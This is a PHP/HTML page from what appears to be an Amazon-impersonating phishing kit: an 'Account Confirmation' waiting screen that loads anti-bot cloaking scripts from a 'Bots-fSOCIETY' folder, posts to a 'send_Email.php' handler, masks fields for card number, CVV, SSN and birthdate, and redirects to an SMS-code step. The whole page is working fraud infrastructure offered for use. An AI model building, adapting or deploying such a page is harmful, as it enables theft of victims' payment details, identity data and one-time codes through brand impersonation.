<?php
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");

include("../Bots-fSOCIETY/anti1.php");
include("../Bots-fSOCIETY/anti2.php");
include("../Bots-fSOCIETY/anti3.php");
include("../Bots-fSOCIETY/anti4.php");
include("../Bots-fSOCIETY/anti5.php");
include("../Bots-fSOCIETY/anti6.php");
include("../Bots-fSOCIETY/anti7.php");
include("../Bots-fSOCIETY/anti8.php");

?><html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-11-06"><head>



    <meta http-equiv="refresh" content="16;URL='./Sms'" />    


<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title dir="ltr">Amazon MyAccount</title>

    
      

      
        <link rel="stylesheet" href="./style/css-088.css">

<link rel="stylesheet" href="./style/css099.css">

      
    <script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/tyle.js"></script>

    
    
    
      
    
    

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

  });
  </script>



<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}

</style>





<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
    background-size: 54px;
    background-position: 111.5% 48.1%;
}

 #cardnumber {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
    background-size: 38px;}

</style>





  </head>

  <body class="ap-locale-fr_FR a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate">




<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
 
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              






<div class="a-section auth-pagelet-container" style="
    width: 412px;
    margin: 0 auto;
">
  

















  
    





<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" action="./system/send_Email.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
      
      

      




  
    
  
    
  
    
  



      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
Account Confirmation </h1>
          
          
          



<script>
   var seconds = 120;
   function secondPassed() {
   var minutes = Math.round((seconds - 30)/60);
   var remainingSeconds = seconds % 60;
   if (remainingSeconds < 10) {
      remainingSeconds = "0" + remainingSeconds; 
   }
   document.getElementById('countdown').innerHTML = "Sent code in the phone" + minutes + ":" + remainingSeconds;
   if (seconds == 0) {
    clearInterval(countdownTimer);
    document.getElementById('countdown').innerHTML = "";
   } else {
    seconds--;
   }
   }
   var countdownTimer = setInterval('secondPassed()', 1000);
</script>













          <div class="a-row a-spacing-base">
            






<div class="loader">Loading...</div>




<style type="text/css">.loader {
  margin: 100px auto;
  font-size: 25px;
  width: 1em;
  height: 1em;
  border-radius: 50%;
  position: relative;
  text-indent: -9999em;
  -webkit-animation: load5 1.1s infinite ease;
  animation: load5 1.1s infinite ease;
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
}
@-webkit-keyframes load5 {
  0%,
  100% {
    box-shadow: 0em -2.6em 0em 0em #e1940e, 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.5), -1.8em -1.8em 0 0em rgba(225,148,14, 0.7);
  }
  12.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.7), 1.8em -1.8em 0 0em #e1940e, 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.5);
  }
  25% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.5), 1.8em -1.8em 0 0em rgba(225,148,14, 0.7), 2.5em 0em 0 0em #e1940e, 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  37.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.5), 2.5em 0em 0 0em rgba(225,148,14, 0.7), 1.75em 1.75em 0 0em #e1940e, 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  50% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.5), 1.75em 1.75em 0 0em rgba(225,148,14, 0.7), 0em 2.5em 0 0em #e1940e, -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  62.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.5), 0em 2.5em 0 0em rgba(225,148,14, 0.7), -1.8em 1.8em 0 0em #e1940e, -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  75% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.5), -1.8em 1.8em 0 0em rgba(225,148,14, 0.7), -2.6em 0em 0 0em #e1940e, -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  87.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.5), -2.6em 0em 0 0em rgba(225,148,14, 0.7), -1.8em -1.8em 0 0em #e1940e;
  }
}
@keyframes load5 {
  0%,
  100% {
    box-shadow: 0em -2.6em 0em 0em #e1940e, 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.5), -1.8em -1.8em 0 0em rgba(225,148,14, 0.7);
  }
  12.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.7), 1.8em -1.8em 0 0em #e1940e, 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.5);
  }
  25% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.5), 1.8em -1.8em 0 0em rgba(225,148,14, 0.7), 2.5em 0em 0 0em #e1940e, 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  37.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.5), 2.5em 0em 0 0em rgba(225,148,14, 0.7), 1.75em 1.75em 0 0em #e1940e, 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  50% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.5), 1.75em 1.75em 0 0em rgba(225,148,14, 0.7), 0em 2.5em 0 0em #e1940e, -1.8em 1.8em 0 0em rgba(225,148,14, 0.2), -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  62.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.5), 0em 2.5em 0 0em rgba(225,148,14, 0.7), -1.8em 1.8em 0 0em #e1940e, -2.6em 0em 0 0em rgba(225,148,14, 0.2), -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  75% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.5), -1.8em 1.8em 0 0em rgba(225,148,14, 0.7), -2.6em 0em 0 0em #e1940e, -1.8em -1.8em 0 0em rgba(225,148,14, 0.2);
  }
  87.5% {
    box-shadow: 0em -2.6em 0em 0em rgba(225,148,14, 0.2), 1.8em -1.8em 0 0em rgba(225,148,14, 0.2), 2.5em 0em 0 0em rgba(225,148,14, 0.2), 1.75em 1.75em 0 0em rgba(225,148,14, 0.2), 0em 2.5em 0 0em rgba(225,148,14, 0.2), -1.8em 1.8em 0 0em rgba(225,148,14, 0.5), -2.6em 0em 0 0em rgba(225,148,14, 0.7), -1.8em -1.8em 0 0em #e1940e;
  }
}</style>

<center>
<h2>Wait for information to be processed</h2>
</center>

          </div>
          

          
          
        </div></div>
      </div>
    </form>
  </div>
  
    
    
      
        
        
        
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
Terms of use    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
  Protection of your personal information
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
   Help
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
Cookies
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
Ads based on your interests    </a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
© 1996-2021, Amazon.com, Inc. or its affiliates.</span>

</div>

      </div>
    </div>

   
    
    
  </div>



</body></html>